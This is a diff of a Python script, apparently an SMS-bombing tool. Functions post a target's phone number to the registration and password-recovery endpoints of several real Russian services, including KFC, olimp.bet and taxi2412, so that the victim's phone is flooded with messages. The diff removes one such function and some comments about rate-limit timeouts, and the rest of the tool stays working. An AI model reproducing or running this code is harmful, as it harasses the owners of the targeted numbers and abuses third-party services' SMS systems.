@@ -86,7 +86,6 @@ def sunlight(phone):
     print(response_sunlight, response_sunlight.content)
 
 
-# тут если слать чаще чем раз примерно в минуту - ту мэни реквестс, надо таймер на минуту ставить
 def bk(phone):
     bkphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
             '-' + phone[8:10]
@@ -95,24 +94,6 @@ def bk(phone):
                                       "g-recaptcha-response": "null"})
     print(response_bk, response_bk.content)
 
-# ваще хз, надо тестить, но должно работать, сначала регает, потом ресторит пароль раз в 3 минуты
-def olimpbet(phone):
-    olmpphn = '7'+phone
-    response_olimpbet = requests.post(url='https://www.olimp.bet/api/smsregistration',
-                                      json={"lang_id": "0", "platforma": "SITE_CUPIS",
-                                            "cash": "3", "telnum": olmpphn,
-                                            "email": "username0002@gmail.com",
-                                            "tag": "c4bee55d6bb50e85287bffe8fd0113d5"})
-    print(response_olimpbet)
-
-    # вот ниже реквест с таймаутом в 3 минуты
-    response_olimpbet = requests.post(url='https://www.olimp.bet/api/user/passrestore/',
-                                      json={"lang_id": "0", "platforma": "SITE_CUPIS",
-                                            "kind": "phone", "data": olmpphn})
-    print(response_olimpbet, response_olimpbet.content)
-
-#  тут какой-то таймаут, надо тестить, мне лень сейчас сидеть и засекать, вроде минута,
-#  но оно как-то хз работает
 def kfc(phone):
     kfcphn = '+7'+phone
     response_kfc = requests.post(url=('https://app-api.kfc.ru/api/v1/'
@@ -148,7 +129,6 @@ def taxi2412regist(phone):
     response_taxi2412 = requests.post(url='https://lk.taxi2412.ru/register', data=data)
     print(response_taxi2412, response_taxi2412.text)
 
-# timeout 60 sec
 def taxi2412recover(phone):
     tx2412phn = '+7' + ' ' + phone[:3] + ' ' + phone[3:6] + '-' + phone[6:8] +\
                 '-' + phone[8:10]
@@ -158,8 +138,6 @@ def taxi2412recover(phone):
     response_taxi2412 = requests.post(url='https://lk.taxi2412.ru/recover', data=data)
     print(response_taxi2412, response_taxi2412.text)
 
-
-# timeout 180 sec
 def ostin(phone):
     ostnphn = '%207%20' + '+' + '(' + phone[:3] + ')' + phone[3:6] + '-' + phone[6:8] + '-'\
               + phone[8:10]
